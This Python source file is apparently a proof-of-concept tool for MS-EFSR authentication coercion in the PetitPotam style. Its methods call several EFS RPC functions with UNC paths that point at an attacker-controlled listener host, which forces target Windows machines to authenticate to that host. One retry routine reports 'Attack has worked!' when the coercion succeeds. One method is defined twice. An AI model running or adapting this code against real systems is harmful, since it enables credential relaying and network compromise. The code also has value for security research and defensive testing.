#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# File name          : coerce_poc.py
# Author             : Podalirius (@podalirius_)
# Date created       : 22 Jun 2022

from RPC_functions.core import *


def gen_random_name(length=8):
    alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    name = ""
    for k in range(length):
        name += random.choice(alphabet)
    return name




class MS_EFSR(RPCProtocol):
    uuid = "c681d488-d850-11d0-8c52-00c04fd90f7e"
    version = "1.0"
    pipe = r"\PIPE\netlogon"

    def EfsRpcFileKeyInfoEx(self, listener):
        if self.dce is not None:
            print("[>] Calling EfsRpcFileKeyInfoEx() ...")
            try:
                request = EfsRpcFileKeyInfoEx()
                #
                BASIC_KEY_INFO = 0x00000001
                CHECK_COMPATIBILITY_INFO = 0x00000002
                UPDATE_KEY_USED = 0x00000100
                CHECK_DECRYPTION_STATUS = 0x00000200
                CHECK_ENCRYPTION_STATUS = 0x00000400
                #
                request['dwFileKeyInfoFlags'] = BASIC_KEY_INFO
                request['Reserved'] = EFS_RPC_BLOB()
                request['FileName'] = '\\\\%s/pipe/coerced\\%s\\file.txt\x00' % (listener, gen_random_name())
                request['InfoClass'] = 0
                # request.dump()
                resp = self.dce.request(request)
            except Exception as e:
                print(e)
        else:
            print("[!] Error: dce is None, you must call connect() first.")
    
    def EfsRpcEncryptFileSrv(self, listener):
        if self.dce is not None:
            print("[>] Calling EfsRpcEncryptFileSrv() ...")
            try:
                request = EfsRpcEncryptFileSrv()
                request['FileName'] = '\\\\%s/pipe/coerced\\%s\\file.txt\x00' % (listener, gen_random_name())
                # request.dump()
                resp = self.dce.request(request)
            except Exception as e:
                print(e)
        else:
            print("[!] Error: dce is None, you must call connect() first.")


    def EfsRpcDecryptFileSrv(self, listener): # ><> "rpc_x_bad_stub_data" error
        if self.dce is not None:
            print("[>] Calling EfsRpcDecryptFileSrv() ...")
            try:
                request = EfsRpcDecryptFileSrv()
                request['FileName'] = '\\\\%s/pipe/coerced\\%s\\file.txt\x00' % (listener, gen_random_name())
                request['OpenFlag'] = 0
                #request.dump()
                resp = self.dce.request(request)
            except Exception as e:
                print(e)
        else:
            print("[!] Error: dce is None, you must call connect() first.")
    
    def EfsRpcQueryUsersOnFile(self, listener, max_retries=3):
        if self.dce is not None:
            print("[>] Calling EfsRpcQueryUsersOnFile() ...")
            tries = 0
            while tries <= max_retries:
                tries += 1
                try:
                    request = EfsRpcQueryUsersOnFile()
                    request['FileName'] = '\\\\%s/pipe/coerced\\%s\\file.txt\x00' % (listener, gen_random_name())
                    # request.dump()
                    resp = self.dce.request(request)
                except Exception as e:
                    if "ERROR_INVALID_NAME" in str(e):
                        # SessionError: code: 0x7b - ERROR_INVALID_NAME - The filename, directory name, or volume label syntax is incorrect.
                        print("  | Got (0x7b):ERROR_INVALID_NAME | This can happen, waiting 20 seconds before retry ...")
                        time.sleep(20)
                    elif "ERROR_BAD_NETPATH" in str(e):
                        # SessionError: code: 0x35 - ERROR_BAD_NETPATH - The network path was not found.
                        print("  | Got (0x35):ERROR_BAD_NETPATH | Attack has worked!")
                        return True
        else:
            print("[!] Error: dce is None, you must call connect() first.")
        return False
    
    def EfsRpcQueryRecoveryAgents(self, listener):
        if self.dce is not None:
            print("[>] Calling EfsRpcQueryRecoveryAgents() ...")
            try:
                request = EfsRpcQueryRecoveryAgents()
                request['FileName'] = '\\\\%s/pipe/coerced\\%s\\file.txt\x00' % (listener, gen_random_name())
                # request.dump()
                resp = self.dce.request(request)
            except Exception as e:
                print(e)
        else:
            print("[!] Error: dce is None, you must call connect() first.")

    def EfsRpcFileKeyInfo(self, listener):
        if self.dce is not None:
            print("[>] Calling EfsRpcFileKeyInfo() ...")
            try:
                request = EfsRpcFileKeyInfo()
                request['FileName'] = '\\\\%s/pipe/coerced\\%s\\file.txt\x00' % (listener, gen_random_name())
                request['InfoClass'] = 0
                # request.dump()
                resp = self.dce.request(request)
            except Exception as e:
                print(e)
        else:
            print("[!] Error: dce is None, you must call connect() first.")

    def EfsRpcDuplicateEncryptionInfoFile(self, listener):
        if self.dce is not None:
            print("[>] Calling EfsRpcDuplicateEncryptionInfoFile() ...")
            try:
                request = EfsRpcDuplicateEncryptionInfoFile()
                request['SrcFileName'] = '\\\\%s/pipe/coerced\\%s\\file123.txt\x00' % (listener, gen_random_name())
                request['DestFileName'] = '\\\\%s/pipe/coerced\\%s\\file321.txt\x00' % (listener, gen_random_name())
                request['dwCreationDisposition'] = 0
                request['dwAttributes'] = 0
                request['RelativeSD'] = EFS_RPC_BLOB()
                request['bInheritHandle'] = 0
                #request.dump()
                resp = self.dce.request(request)
            except Exception as e:
                print(e)
        else:
            print("[!] Error: dce is None, you must call connect() first.")

    def EfsRpcAddUsersToFileEx(self, listener):
        if self.dce is not None:
            print("[>] Calling EfsRpcAddUsersToFileEx() ...")
            try:
                request = EfsRpcAddUsersToFileEx()
                EFSRPC_ADDUSERFLAG_ADD_POLICY_KEYTYPE = 0x00000002
                EFSRPC_ADDUSERFLAG_REPLACE_DDF = 0x00000004
                request['dwFlags'] = EFSRPC_ADDUSERFLAG_ADD_POLICY_KEYTYPE
                request['Reserved'] = NULL
                request['FileName'] = '\\\\%s/pipe/coerced\\%s\\file.txt\x00' % (listener, gen_random_name())
                request['EncryptionCertificates'] = NULL
                #request.dump()
                resp = self.dce.request(request)
            except Exception as e:
                print(e)
        else:
            print("[!] Error: dce is None, you must call connect() first.")

    def EfsRpcFileKeyInfoEx(self, listener):
        if self.dce is not None:
            print("[>] Calling EfsRpcFileKeyInfoEx() ...")
            try:
                request = EfsRpcFileKeyInfoEx()
                #
                BASIC_KEY_INFO = 0x00000001
                CHECK_COMPATIBILITY_INFO = 0x00000002
                UPDATE_KEY_USED = 0x00000100
                CHECK_DECRYPTION_STATUS = 0x00000200
                CHECK_ENCRYPTION_STATUS = 0x00000400
                #
                request['dwFileKeyInfoFlags'] = BASIC_KEY_INFO
                request['Reserved'] = EFS_RPC_BLOB()
                request['FileName'] = '\\\\%s/pipe/coerced\\%s\\file.txt\x00' % (listener, gen_random_name())
                request['InfoClass'] = 0
                # request.dump()
                resp = self.dce.request(request)
            except Exception as e:
                print(e)
        else:
            print("[!] Error: dce is None, you must call connect() first.")


